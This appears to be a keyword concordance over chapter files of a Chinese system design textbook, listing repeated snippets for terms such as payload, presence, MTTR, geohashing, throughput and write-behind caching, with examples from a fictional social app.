  c11_b06.md: ...带发送。服务器通过验证签名来验证 JWT（用 secret key 重新计算并比对 token 的签名）。如果签名有效，payload 数据就可信——服务器无需任何数据库或 Redis 查找就知道 user_id 和 username。   #### J...
  c11_b12.md: ...**答案：** **JWT（JSON Web Token）** 是一个紧凑、加密签名的 token，直接把会话 payload（user ID、username、过期时间等）包含在 token 自身中。服务器在登录时创建 payload 并用 s...
  c11_b12.md: ...接把会话 payload（user ID、username、过期时间等）包含在 token 自身中。服务器在登录时创建 payload 并用 secret key 签名。后续请求中，服务器通过重新计算签名并比对来验证 JWT——无需外部存储查找。  **...
  c15_b12.md: ...的 `follow_request` 记录，并通过 Outbox 模式发布 `follow.requested` 事件，payload 为 `{follower_id: 42, followed_id: 77, request_id: "req_a1b2...
  c19_b03.md: ...中 access token 的主要格式。JWT 是 Base64url 编码、密码学签名的字符串，编码一个 JSON payload。  JWT 由点分隔的三部分组成：  **Header**（用于签名 token 的算法）：`{"alg": "RS2...
  c19_b03.md: ...eader**（用于签名 token 的算法）：`{"alg": "RS256", "typ": "JWT"}`  **Payload**（claims——关于用户和 token 的断言）：       {       "sub": "user_8821...
  c19_b03.md: ...d:posts write:posts"     }   **Signature**：用服务器私钥对 header 和 payload 做的密码学签名。  完整 token 形如：`eyJhbGci...eyJzdWIi...SflKxwRJSMeKKF...
  c19_b03.md: ...xwRJSMeKKF2...`  Feed Service 收到带 JWT 的请求时，用对应公钥验证签名。如果签名有效，payload 中的 claims 可信——token 由 SocialSnap 认证服务器创建且未被篡改。Feed Service...
  c19_b03.md: ...claims 可信——token 由 SocialSnap 认证服务器创建且未被篡改。Feed Service 可以从 payload 中提取 `user_id` 和 `scope` 而无需每次都调用 auth 服务器——密码学签名提供了信任。  这就是...
  c19_b03.md: ...中 access token 的主要格式。JWT 是 Base64url 编码、密码学签名的字符串，编码一个 JSON payload。  JWT 由点分隔的三部分组成：  **Header**（用于签名 token 的算法）：`{"alg": "RS2...
  c19_b03.md: ...eader**（用于签名 token 的算法）：`{"alg": "RS256", "typ": "JWT"}`  **Payload**（claims——关于用户和 token 的断言）：       {       "sub": "user_8821...
  c19_b03.md: ...d:posts write:posts"     }   **Signature**：用服务器私钥对 header 和 payload 做的密码学签名。  完整 token 形如：`eyJhbGci...eyJzdWIi...SflKxwRJSMeKKF...
  c19_b03.md: ...xwRJSMeKKF2...`  Feed Service 收到带 JWT 的请求时，用对应公钥验证签名。如果签名有效，payload 中的 claims 可信——token 由 SocialSnap 认证服务器创建且未被篡改。Feed Service...
  c19_b03.md: ...claims 可信——token 由 SocialSnap 认证服务器创建且未被篡改。Feed Service 可以从 payload 中提取 `user_id` 和 `scope` 而无需每次都调用 auth 服务器——密码学签名提供了信任。  这就是...
  c19_b06.md: ...r，指示浏览器只执行可信来源的脚本（`script-src 'self'` 意味着只执行同源的脚本）。即使注入 XSS payload，CSP 也阻止其加载外部脚本。...

=== presence (18 occurrences) ===
  c09_b15.md: ...**在线状态数据模型：**  每个用户的在线状态是一个带 TTL 的 Redis key：       Key:   presence:{user_id}     Value: {last_seen: timestamp, status: "online...
  c09_b15.md: ..., status: "online"}     TTL:   5 minutes (300 seconds)   如果 presence key 存在，用户就是“在线”的。5 分钟无活动后 key 自动过期——不需要后台清理任务。Redis 原生 key...
  c09_b15.md: ...* 100,000 并发在线用户 × 每 30 秒 1 次心跳 = 约 3,333 次写入/秒  每次写入是 `SET presence:{user_id} {payload} EX 300`——一条 Redis 命令，亚毫秒级。单个 Redis 节点可轻...
  c09_b15.md: ...存储（第 6 章 6.3 节）的合适工作负载。  **API 设计：**  两个端点：       POST /api/presence/heartbeat       → 需要认证。刷新 presence:{user_id} 的 TTL。返回 200。...
  c09_b15.md: ...*  两个端点：       POST /api/presence/heartbeat       → 需要认证。刷新 presence:{user_id} 的 TTL。返回 200。       → 活跃客户端每 30 秒调用一次。      GET /...
  c09_b15.md: ...200。       → 活跃客户端每 30 秒调用一次。      GET /api/users/{user_id}/presence       → 返回 { "online": true/false, "last_seen": "..." }...
  c09_b15.md: ...": true/false, "last_seen": "..." }       → 检查 Redis：EXISTS presence:{user_id}   **客户端更新协议：**  如果客户端已经打开 WebSocket 连接（用于通知，见 9.6...
  c09_b15.md: ...*为 feed 渲染查询在线状态：**  渲染 feed 头像时，客户端可以批量查询所有可见用户的在线状态：`MGET presence:42 presence:107 presence:88 ...`——一次 Redis 多 key 读取。响应指出哪些...
  c09_b15.md: ...在线状态：**  渲染 feed 头像时，客户端可以批量查询所有可见用户的在线状态：`MGET presence:42 presence:107 presence:88 ...`——一次 Redis 多 key 读取。响应指出哪些 user ID 有 pr...
  c09_b15.md: ...eed 头像时，客户端可以批量查询所有可见用户的在线状态：`MGET presence:42 presence:107 presence:88 ...`——一次 Redis 多 key 读取。响应指出哪些 user ID 有 presence key（在线...
  c09_b15.md: ...ce:107 presence:88 ...`——一次 Redis 多 key 读取。响应指出哪些 user ID 有 presence key（在线），哪些没有。  **Q2.**（联系第 8 章消息队列和第 7 章缓存）SocialSnap 顶部导航中...
  c21_b06.md: ...指示是在线状态（presence）功能。它看似简单——维护在线用户 ID 集合，用户连接时加入，断开时移除。但大规模下，presence 带来有趣设计挑战。   #### 朴素方法及其问题  **朴素设计：** 用户 A 连接 WebSocket 时，连接...
  c21_b06.md: ...50 万（500,000）并发（concurrent）用户下，在线状态更新（加入、离开、网络（network）波动）给 presence 存储造成高写入率。如果每次连接事件都触及集中 Redis，速率可达每秒数千次写入。 3. **跨服务器可见性：** 用...
  c21_b07.md: ...可见范围。多数聊天系统不会向 5000 万（50 million）用户显示“在线/离线”，只向正在与该人对话的用户显示。presence 服务接收活跃对话的请求，而非同时来自整个用户群。这极大降低 presence 存储的读速率。   ### 21.5 已...
  c21_b07.md: ...线/离线”，只向正在与该人对话的用户显示。presence 服务接收活跃对话的请求，而非同时来自整个用户群。这极大降低 presence 存储的读速率。   ### 21.5 已读回执作为分布式状态...
  c21_b11.md: ...聊天系统的“运营复杂度”列始终高于 URL 短链。这是有状态的（stateful）实时系统固有的——连接管理、心跳 presence、多服务器消息路由和投递状态机都需要持续运营关注，而无状态 URL 短链不需要。  一致性列很有意思：消息持久化本身是强...
  c21_b12.md: ...收不到断开事件。没有 TTL，用户将永远显示在线。有 TTL 后，键在 60 秒无心跳后过期，标记用户离线。60 秒的 presence 陈旧窗口是可接受的权衡：替代方案（更快检测断开）需要更频繁心跳，增加 Redis 写入负载和移动设备耗电。...
  c21_b16.md: ...上不精确的功能（记住 60 秒陈旧）这是糟糕体验。架构用 Redis 处理在线状态——一个优先可用性和速度的系统。如果 presence Redis 暂时不可用，UI 简单地把所有用户显示为离线（降级但可用），而非返回错误。  这是第 4 章原则的具体化：...

=== jpg (18 occurrences) ===
  c10_b04.md: ...文档——任何字节） * 一个 **key**（唯一标识符——通常像路径：`users/42/profile-photo.jpg`） * **元数据**（content type、自定义属性、标签）  对象通过 HTTP API 访问：用 `PUT...
  c10_b04.md: ...socialsnap-media         Object key: users/42/profile-photo.jpg         Object key: users/42/cover-photo.jpg         Object...
  c10_b04.md: .../profile-photo.jpg         Object key: users/42/cover-photo.jpg         Object key: posts/1001/photo-1.jpg         Object k...
  c10_b04.md: ...s/42/cover-photo.jpg         Object key: posts/1001/photo-1.jpg         Object key: posts/1001/photo-2.jpg         Object k...
  c10_b04.md: ...sts/1001/photo-1.jpg         Object key: posts/1001/photo-2.jpg         Object key: posts/1001/photo-3.jpg   这些 key 看起来像路径，...
  c10_b04.md: ...sts/1001/photo-2.jpg         Object key: posts/1001/photo-3.jpg   这些 key 看起来像路径，但只是字符串——没有真实目录结构。列出“用户 42 的所有对象”是前缀搜索：`LIST...
  c10_b06.md: ...在应用服务器本地文件系统**       /var/socialsnap/photos/user_42_profile.jpg   这比数据库有改进，但引入不同问题：文件在某一台特定服务器上。当 SocialSnap 增加应用服务器（第 11 章...
  c10_b06.md: ...Bucket: socialsnap-media     Key: users/42/profile_photo_v3.jpg   照片上传工作流：  1. 用户通过浏览器上传照片。 2. 应用服务器接收上传。 3. 应用服务器处理图片（调整大小...
  c10_b06.md: ...8 章）。 4. 应用服务器把处理后的照片上传到对象存储：`PUT users/42/profile_photo_v3.jpg`。 5. 应用服务器在 PostgreSQL 中存储对象存储 URL：`UPDATE users SET photo_...
  c10_b06.md: ...= 'https://storage.socialsnap.com/users/42/profile_photo_v3.jpg' WHERE id = 42`。 6. 使用 Redis 使该用户资料缓存失效（第 7 章）：`DEL user:42...
  c10_b06.md: ...c="https://storage.socialsnap.com/users/42/profile_photo_v3.jpg">`。 3. 用户浏览器直接从对象存储获取图片——完全绕过应用服务器。 4. 对高流量资料，对象存储 URL 经过 C...
  c10_b12.md: ...储系统建议在 key 中加入随机哈希前缀：       原始 key:  users/42/profile_photo.jpg     优化 key: ab3f/users/42/profile_photo.jpg  （"ab3f" = hash...
  c10_b12.md: ...2/profile_photo.jpg     优化 key: ab3f/users/42/profile_photo.jpg  （"ab3f" = hash(42) 截断到 4 字符）   该前缀让 key 在内部 shard 间分布更均匀。这...
  c10_b15.md: ...，应用生成包含版本标识的新对象 key：       旧 key: users/42/profile_photo_v3.jpg  → URL: https://cdn.socialsnap.com/users/42/profile_photo_v...
  c10_b15.md: ...→ URL: https://cdn.socialsnap.com/users/42/profile_photo_v3.jpg     新 key: users/42/profile_photo_v4.jpg  → URL: https://cd...
  c10_b15.md: ...2/profile_photo_v3.jpg     新 key: users/42/profile_photo_v4.jpg  → URL: https://cdn.socialsnap.com/users/42/profile_photo_v...
  c10_b15.md: ...→ URL: https://cdn.socialsnap.com/users/42/profile_photo_v4.jpg   因为每次上传 URL 都变，旧 URL 的 CDN 和浏览器缓存根本不会再被请求——它们会通过 TTL 自然过期，...
  c10_b15.md: ...bug 模式。  **4. CDN 对旧图片 URL 的缓存：** 由于旧 URL（`profile_photo_v3.jpg`）在资料缓存失效后不再被任何应用代码引用，没有用户会再请求它。CDN 中旧 URL 条目会简单地通过 TTL 过期（对...

=== mttr (18 occurrences) ===
  c16_b02.md: ...#### MTBF 与 MTTR  两个指标定义任何系统的可靠性画像：  **平均故障间隔时间（Mean Time Between Failures，M...
  c16_b02.md: ...的系统大约每年失败一次。MTBF 越高，故障越不频繁。  **平均恢复时间（Mean Time To Recovery，MTTR）** 是故障后恢复服务的平均时间。MTTR 5 分钟的系统从故障中快速恢复。MTTR 4 小时的系统会让用户长时间无服...
  c16_b02.md: ...越不频繁。  **平均恢复时间（Mean Time To Recovery，MTTR）** 是故障后恢复服务的平均时间。MTTR 5 分钟的系统从故障中快速恢复。MTTR 4 小时的系统会让用户长时间无服务。MTTR 越低，恢复越快。  **可用性...
  c16_b02.md: ...Time To Recovery，MTTR）** 是故障后恢复服务的平均时间。MTTR 5 分钟的系统从故障中快速恢复。MTTR 4 小时的系统会让用户长时间无服务。MTTR 越低，恢复越快。  **可用性（availability）** 用两者表...
  c16_b02.md: ...* 是故障后恢复服务的平均时间。MTTR 5 分钟的系统从故障中快速恢复。MTTR 4 小时的系统会让用户长时间无服务。MTTR 越低，恢复越快。  **可用性（availability）** 用两者表达：`Availability = MTBF...
  c16_b02.md: ...**可用性（availability）** 用两者表达：`Availability = MTBF / (MTBF + MTTR)`。著名的可用性“几个 9”就是该比率的目标：  * 99% 可用性（“两个 9”）：每年约 87.6 小时停机 *...
  c16_b02.md: ...故障发生频率（提高 MTBF），要么缩短恢复时间（降低 MTTR）。实践中两者都重要，但现代可靠性工程主要关注**降低 MTTR**——因为硬件和软件故障最终不可避免，而快速恢复能限制影响。   #### 常见误解  常见错误是只关注防止故障（提高...
  c16_b03.md: ...障转移不是瞬时的——活跃实例失败与被动实例变活跃之间存在窗口，期间系统不可用。这个窗口（**故障转移时间**）直接贡献 MTTR。...
  c16_b12.md: ...#### 概念检测  **Q1.** 定义 MTBF 和 MTTR。在频繁失败且恢复时间短的系统中，哪个对可用性影响更大？  **答案：** MTBF（平均故障间隔时间）是两次故障事件之...
  c16_b12.md: ...，哪个对可用性影响更大？  **答案：** MTBF（平均故障间隔时间）是两次故障事件之间的平均时间——系统失败的频率。MTTR（平均恢复时间）是故障后恢复服务的平均时间——系统恢复的速度。  Availability = MTBF / (MTBF...
  c16_b12.md: ...恢复时间）是故障后恢复服务的平均时间——系统恢复的速度。  Availability = MTBF / (MTBF + MTTR)。  在频繁失败且恢复时间短的系统中，MTTR 的边际影响更大。例如：MTBF = 10 小时（每天失败 6 次），M...
  c16_b12.md: ...的速度。  Availability = MTBF / (MTBF + MTTR)。  在频繁失败且恢复时间短的系统中，MTTR 的边际影响更大。例如：MTBF = 10 小时（每天失败 6 次），MTTR = 5 分钟。可用性 = 10 / (1...
  c16_b12.md: ...R)。  在频繁失败且恢复时间短的系统中，MTTR 的边际影响更大。例如：MTBF = 10 小时（每天失败 6 次），MTTR = 5 分钟。可用性 = 10 / (10 + 0.083) ≈ 99.2%。如果 MTTR 降到 1 分钟（提升 5...
  c16_b12.md: ...小时（每天失败 6 次），MTTR = 5 分钟。可用性 = 10 / (10 + 0.083) ≈ 99.2%。如果 MTTR 降到 1 分钟（提升 5 倍），可用性 = 10 / (10 + 0.017) ≈ 99.8%——显著提升。如果 MT...
  c16_b12.md: ...) ≈ 99.6%——也是显著提升，但通常比提升恢复速度更难实现。  在高频失败环境（硬件故障、网络链路抖动）中，降低 MTTR 通常比大幅降低 MTBF 更可行。这是 SRE 的理念：投资于快速检测、快速诊断和快速恢复，而不是试图让单个组件达到不...
  c16_b19.md: ...### 本章总结  本章通过解决“即使是设计良好的系统也会失败”这一现实，完成了架构之旅。理解 MTBF 和 MTTR 把可靠性从“防止所有失败”重新定义为“快速失败并快速恢复”。可用性由两个维度决定，降低 MTTR 通常是更可行、更有影...
  c16_b19.md: ...。理解 MTBF 和 MTTR 把可靠性从“防止所有失败”重新定义为“快速失败并快速恢复”。可用性由两个维度决定，降低 MTTR 通常是更可行、更有影响力的投资。  冗余消除单点故障；故障转移（主备或主主）处理组件失败时的切换。熔断器通过检测失败依...
  c17_b08.md: ...被监控。谁来监视监视者？）  但收益在几乎任何规模都超过成本。盲目飞行的团队——依赖用户报告来发现 outage——的 MTTR 和每次事故影响范围始终高于具备良好可观测性的团队。...

=== geohashing (18 occurrences) ===
  c25_b02.md: ...### 25.1 Geohashing——把空间变成键  设计位置系统前，我们需要一种把地理位置表示为数据库和缓存可高效查询形式的方法。司机位置是一对浮点坐标...
  c25_b02.md: ...W。朴素地，找某乘客 5 km 内所有司机需要同时对纬度和经度做范围查询——大多数标准数据库处理不好的二维查询。  **Geohashing** 通过把 2D 坐标映射成保留邻近性的 1D 字符串来解决。   #### 定义：Geohash  **Geohas...
  c25_b02.md: ...2km × 0.6km 区域；5 字符 geohash 识别约 4.9km × 4.9km 区域。  plain 语言：geohashing 把“我在纬度 37.77，经度 -122.41”变成 “9q8yy”——一个 5 字符字符串，识别包含该位置约 5km...
  c25_b02.md: ...中，以 geohash 为键。找附近司机现在变成按 geohash 前缀键查找——查找本身是 O(1)。   #### Geohashing 的边界情况  Geohashing 有已知局限：相邻地理区域有时 geohash 值完全不同，如果它们位于主要二分边界...
  c25_b02.md: ...司机现在变成按 geohash 前缀键查找——查找本身是 O(1)。   #### Geohashing 的边界情况  Geohashing 有已知局限：相邻地理区域有时 geohash 值完全不同，如果它们位于主要二分边界两侧。两个司机地理上可能只隔 10...
  c25_b02.md: ...### 25.1 Geohashing——把空间变成键  设计位置系统前，我们需要一种把地理位置表示为数据库和缓存可高效查询形式的方法。司机位置是一对浮点坐标...
  c25_b02.md: ...W。朴素地，找某乘客 5 km 内所有司机需要同时对纬度和经度做范围查询——大多数标准数据库处理不好的二维查询。  **Geohashing** 通过把 2D 坐标映射成保留邻近性的 1D 字符串来解决。   #### 定义：Geohash  **Geohas...
  c25_b02.md: ...2km × 0.6km 区域；5 字符 geohash 识别约 4.9km × 4.9km 区域。  plain 语言：geohashing 把“我在纬度 37.77，经度 -122.41”变成 “9q8yy”——一个 5 字符字符串，识别包含该位置约 5km...
  c25_b02.md: ...中，以 geohash 为键。找附近司机现在变成按 geohash 前缀键查找——查找本身是 O(1)。   #### Geohashing 的边界情况  Geohashing 有已知局限：相邻地理区域有时 geohash 值完全不同，如果它们位于主要二分边界...
  c25_b02.md: ...司机现在变成按 geohash 前缀键查找——查找本身是 O(1)。   #### Geohashing 的边界情况  Geohashing 有已知局限：相邻地理区域有时 geohash 值完全不同，如果它们位于主要二分边界两侧。两个司机地理上可能只隔 10...
  c25_b03.md: ...#### 常见误解  一个常见误解是 geohashing 保证附近点总是共享相同前缀。并非如此——它只是让这“很可能”。二分边界问题意味着任何使用 geohashing 的地理...
  c25_b03.md: ...误解是 geohashing 保证附近点总是共享相同前缀。并非如此——它只是让这“很可能”。二分边界问题意味着任何使用 geohashing 的地理匹配系统必须在搜索中包含邻接单元格。忽略邻接单元格会导致匹配系统偶尔找不到最近司机，因为他们位于二分边界另一侧...
  c25_b08.md: ...#### 概念检测  **Q1.** 什么是 geohashing，为什么拼车匹配服务需要查询 9 个单元格而不是 1 个？  **答案：** Geohashing 把地理坐标（纬度、经...
  c25_b08.md: ...*Q1.** 什么是 geohashing，为什么拼车匹配服务需要查询 9 个单元格而不是 1 个？  **答案：** Geohashing 把地理坐标（纬度、经度）编码成一个识别矩形单元格的短字符串。附近位置倾向于共享 geohash 前缀——同一单元格内所...
  c25_b08.md: ...#### 概念检测  **Q1.** 什么是 geohashing，为什么拼车匹配服务需要查询 9 个单元格而不是 1 个？  **答案：** Geohashing 把地理坐标（纬度、经...
  c25_b08.md: ...*Q1.** 什么是 geohashing，为什么拼车匹配服务需要查询 9 个单元格而不是 1 个？  **答案：** Geohashing 把地理坐标（纬度、经度）编码成一个识别矩形单元格的短字符串。附近位置倾向于共享 geohash 前缀——同一单元格内所...
  c25_b13.md: ...策略选择。   ### 本章总结  本章在决定性约束——实时延迟——下设计了拼车服务，该约束级联到每个架构选择。  **Geohashing** 把 2D 空间邻近问题变成 1D 键查找，实现键值存储中的快速司机发现。8 邻接单元格查询修正了边界伪影。  **...
  c28_b14.md: ...caching** (Ch 7, 24) | 命中极低；未命中中 | 最终（TTL 或显式失效） | 极高 | 中 **Geohashing** (Ch 25) | 极低（前缀键查找） | 最终（空间索引异步更新） | 高 | 低 **Sloppy quoru...

=== impact (18 occurrences) ===
  c28_b10.md: ...#### 第一部分：基础  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Co...
  c28_b10.md: ...# 第一部分：基础  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|...
  c28_b10.md: ...oncept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Caching** (C...
  c28_b11.md: ...#### 第二部分：构建块  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Co...
  c28_b11.md: ...第二部分：构建块  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|...
  c28_b11.md: ...oncept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Relational D...
  c28_b12.md: ...#### 第三部分：扩展模式  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Co...
  c28_b12.md: ...第三部分：扩展模式  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|...
  c28_b12.md: ...oncept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Horizontal s...
  c28_b13.md: ...#### 第四部分：可靠性与运维  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Co...
  c28_b13.md: ...部分：可靠性与运维  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|...
  c28_b13.md: ...oncept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Graceful deg...
  c28_b14.md: ...#### 第五部分：案例研究模式  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Co...
  c28_b14.md: ...部分：案例研究模式  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|...
  c28_b14.md: ...oncept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **URL shorteni...
  c28_b15.md: ...#### 第六部分：组织与元层面  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Co...
  c28_b15.md: ...部分：组织与元层面  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|...
  c28_b15.md: ...oncept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Microservice...

=== throughput (17 occurrences) ===
  c02_b01.md: ...么，对我的用户来说这个牺牲值得吗？”  从每个用户真正关心的问题开始：有多快？   ### 2.1 Latency 与 Throughput——速度与容量  想象一条高速公路。汽车从一个城市开到另一个城市。对司机来说重要的是两件事：每辆车开多快（速度），以及每...
  c02_b01.md: ...说重要的是两件事：每辆车开多快（速度），以及每小时能过多少辆车（容量）。它们相关，但独立。  Latency（延迟）和 throughput（吞吐）就是系统中对应的概念。   #### 定义：Latency  **Latency（延迟）** 是从请求发出到响应...
  c02_b01.md: ...,000 位用户等 5 秒才得到响应。这不是罕见的边缘情况——这是相当一部分用户正在经历糟糕体验。   #### 定义：Throughput  **Throughput（吞吐）** 是系统每单位时间能处理的操作数量。对于 Web 服务，通常用 **reques...
  c02_b01.md: ...得到响应。这不是罕见的边缘情况——这是相当一部分用户正在经历糟糕体验。   #### 定义：Throughput  **Throughput（吞吐）** 是系统每单位时间能处理的操作数量。对于 Web 服务，通常用 **requests per second（...
  c02_b01.md: ...么，对我的用户来说这个牺牲值得吗？”  从每个用户真正关心的问题开始：有多快？   ### 2.1 Latency 与 Throughput——速度与容量  想象一条高速公路。汽车从一个城市开到另一个城市。对司机来说重要的是两件事：每辆车开多快（速度），以及每...
  c02_b01.md: ...说重要的是两件事：每辆车开多快（速度），以及每小时能过多少辆车（容量）。它们相关，但独立。  Latency（延迟）和 throughput（吞吐）就是系统中对应的概念。   #### 定义：Latency  **Latency（延迟）** 是从请求发出到响应...
  c02_b01.md: ...,000 位用户等 5 秒才得到响应。这不是罕见的边缘情况——这是相当一部分用户正在经历糟糕体验。   #### 定义：Throughput  **Throughput（吞吐）** 是系统每单位时间能处理的操作数量。对于 Web 服务，通常用 **reques...
  c02_b01.md: ...得到响应。这不是罕见的边缘情况——这是相当一部分用户正在经历糟糕体验。   #### 定义：Throughput  **Throughput（吞吐）** 是系统每单位时间能处理的操作数量。对于 Web 服务，通常用 **requests per second（...
  c02_b02.md: ...#### Latency-Throughput 权衡  有趣的地方在这里。Latency 和 throughput 之间存在张力。  假设你有一个数据库，处理查询非常...
  c02_b02.md: ...#### Latency-Throughput 权衡  有趣的地方在这里。Latency 和 throughput 之间存在张力。  假设你有一个数据库，处理查询非常快——每次 1 毫秒——但一次只能处理一个。请求流排成队。每个请求都...
  c02_b02.md: ...### 常见误解  人们常常说“我们需要低延迟和高吞吐”，仿佛它们是独立目标。它们是相关的。关系大致如下：       Throughput ≈ Concurrency / Latency   这是 Little's Law（利特尔法则）的非正式表达。如果每个...
  c02_b02.md: ...#### Latency-Throughput 权衡  有趣的地方在这里。Latency 和 throughput 之间存在张力。  假设你有一个数据库，处理查询非常...
  c02_b02.md: ...#### Latency-Throughput 权衡  有趣的地方在这里。Latency 和 throughput 之间存在张力。  假设你有一个数据库，处理查询非常快——每次 1 毫秒——但一次只能处理一个。请求流排成队。每个请求都...
  c02_b02.md: ...### 常见误解  人们常常说“我们需要低延迟和高吞吐”，仿佛它们是独立目标。它们是相关的。关系大致如下：       Throughput ≈ Concurrency / Latency   这是 Little's Law（利特尔法则）的非正式表达。如果每个...
  c02_b06.md: ...说这个 tradeoff 值得吗？   ### 2.7 SLI、SLO 与 SLA——把权衡变成承诺  Latency、throughput、availability——到目前为止这些还是抽象指标。真实系统需要把这些指标变成承诺：对用户的承诺、对客户的承诺、对...
  c02_b09.md: ...的 exactly-once 方案的成本。  **Q2.** 你正在设计一个银行转账系统。请把六个指标（latency、throughput、availability、consistency、durability、partition tolerance）按对该...
  c02_b09.md: ...ncy（一致性） > Availability（可用性） > Partition Tolerance（分区容错性） > Throughput（吞吐） > Latency（延迟）**  **为什么持久性第一：** 确认后却丢失的写对银行是灾难性失败。如果用户转...

=== ram (17 occurrences) ===
  c03_b01.md: ...用 | 1 ns | CPU 能做的最快的事 | | L2 缓存引用 | 4 ns | 比 L1 慢约 4 倍 | | RAM 访问 | 100 ns | 比 L1 慢约 100 倍 | | 用 Snappy 压缩 1KB | 3 μs | 快，...
  c03_b01.md: ...| 比 L1 慢约 100 倍 | | 用 Snappy 压缩 1KB | 3 μs | 快，但不是免费 | | 从 RAM 顺序读 1MB | 10 μs | RAM 顺序读取很快 | | SSD 随机读 | 150 μs | SSD 快，但...
  c03_b01.md: ...Snappy 压缩 1KB | 3 μs | 快，但不是免费 | | 从 RAM 顺序读 1MB | 10 μs | RAM 顺序读取很快 | | SSD 随机读 | 150 μs | SSD 快，但不如 RAM | | 从 SSD 顺序读 1...
  c03_b01.md: ...读 1MB | 10 μs | RAM 顺序读取很快 | | SSD 随机读 | 150 μs | SSD 快，但不如 RAM | | 从 SSD 顺序读 1MB | 1 ms | 顺序读取远快于随机读 | | HDD 寻道 + 读取 | 10...
  c03_b01.md: ...HDD 顺序读 1MB | 20 ms | HDD 顺序读比 SSD 慢约 20 倍 |  花点时间感受这些数字的量级。RAM 比 SSD 快 100 倍。SSD 随机读比 HDD 快 100 倍。跨洲网络往返比同一数据中心往返慢 300 倍。...
  c03_b06.md: ...#### 概念检测  **Q1.** 不查表，估算 SSD 随机读与 RAM 访问的延迟比例。并解释这个差距在物理上为什么存在。  **答案：** SSD 随机读约 150 μs；RAM 访问约...
  c03_b06.md: ...随机读与 RAM 访问的延迟比例。并解释这个差距在物理上为什么存在。  **答案：** SSD 随机读约 150 μs；RAM 访问约 100 ns。比例是 150,000 ns / 100 ns = 1500 倍。  这个差距存在是因为 RAM...
  c03_b06.md: ...RAM 访问约 100 ns。比例是 150,000 ns / 100 ns = 1500 倍。  这个差距存在是因为 RAM 是**电子的**——晶体管以电子速度开关，没有机械延迟。SSD 也是电子的，但数据存储在 NAND 闪存单元中，读取需...
  c03_b06.md: ...10 秒查询才开始，然后再花 10ms 执行 * 很多用户的实际延迟：10 秒以上  如果改成首次请求后把主页缓存在 RAM：  * 缓存访问约 100 ns，加上少量开销 → 实际上 < 1 ms * 10,000 个并发请求可并行从缓存服务...
  c03_b06.md: ...个并发请求可并行从缓存服务 * 所有用户的实际延迟：< 1 ms  延迟比例大约是 10,000:1。把热门内容缓存到 RAM 不是小优化——它常常是系统能跑和完全无响应之间的区别。...
  c03_b10.md: ...字，只用几分钟能收集到的信息，就能做出好的架构决策。  工具：  * **延迟数字：** 知道 L1 缓存（1 ns）、RAM（100 ns）、SSD（150 μs）、HDD（10 ms）和网络（0.5–150 ms）的数量级。这些是你这个世界的...
  c11_b07.md: ...现。   #### 定义：垂直扩展（Scale Up）  **垂直扩展**指增加单台机器资源：更多 CPU 核心、更大 RAM、更快存储。目标是让现有服务器更有能力。  plain 语言：垂直扩展就是升级机器。  **优点：**  * 简单：无需...
  c11_b07.md: ...。  **局限：**  * 存在物理上限。截至 2024 年，AWS 最大实例有 448 个 vCPU 和 24 TB RAM。你无法给单台机器加第 2,000 个 CPU。 * 成本非线性：一台 10 倍 RAM 的机器通常比基础（BASE）实...
  c11_b07.md: ...个 vCPU 和 24 TB RAM。你无法给单台机器加第 2,000 个 CPU。 * 成本非线性：一台 10 倍 RAM 的机器通常比基础（BASE）实例贵 10 倍以上。 * 单台机器再强也是单点故障。 * 升级需要停机（不过云厂商通常可...
  c11_b12.md: ...系统中通常如何组合？  **答案：**  **垂直扩展（scale up）：** 增加单台机器容量。更多 CPU、更大 RAM、更快存储。机器无需增加复杂度即可处理更多负载。  优点：简单（无需改代码）、无协调开销、对任何瓶颈都立即有效。  局限...
  c12_b03.md: ...—数据库要花时间去磁盘读索引页。  多少读副本都没用。主库本身跟不上了。  根本问题：一台数据库服务器无论多强，CPU、RAM、磁盘带宽和网络带宽都有限。一旦触及这些极限，垂直扩展（加 RAM、更快磁盘）收益递减，最终撞到物理极限。  解决方案是...
  c23_b09.md: ...0 billion）URL 平均 100 字节，精确 seen-set 约需 1 TB 内存——昂贵，可能超过单机可用 RAM。Bloom filter 用多个哈希函数每个条目只存几位；1% 误报率下可在大约 10 GB 内表示 100 亿 UR...

=== behind (17 occurrences) ===
  c07_b04.md: ...直接调节新鲜度与性能 tradeoff（权衡）的旋钮。   ### 7.4 Write-Through 和 Write-Behind——其他模式  Cache-aside 是懒加载：只在未命中时填充缓存。另外两种模式采取更主动的方式。...
  c07_b05.md: ...ough 在读写比高且能承受写入开销时表现良好。用户资料——读数千次、很少更新——是好候选。   #### Write-Behind（Write-Back）缓存  在 **write-behind caching** 中，写入立即进入缓存，并在延迟后异...
  c07_b05.md: ...千次、很少更新——是好候选。   #### Write-Behind（Write-Back）缓存  在 **write-behind caching** 中，写入立即进入缓存，并在延迟后异步刷到数据库。  **写入路径：**       1. Writ...
  c07_b05.md: ...久性风险。** 如果缓存服务器在脏条目刷盘前失败，数据就丢失了。你已经向用户返回成功，但数据从未持久化。  Write-behind 用于特定的高写入场景，其中一些数据丢失可接受（分析事件、计数器、非关键指标）。它几乎从不用于需要持久性的事务数据。...
  c07_b05.md: ...回想第 5 章，ACID 的 D——**持久性（Durability）**——意味着已提交事务在失败中幸存。Write-behind 缓存用持久性换取写入性能。这正是权衡矩阵追踪的 tradeoff（权衡）类型。   #### 常见误解  许多工程师假...
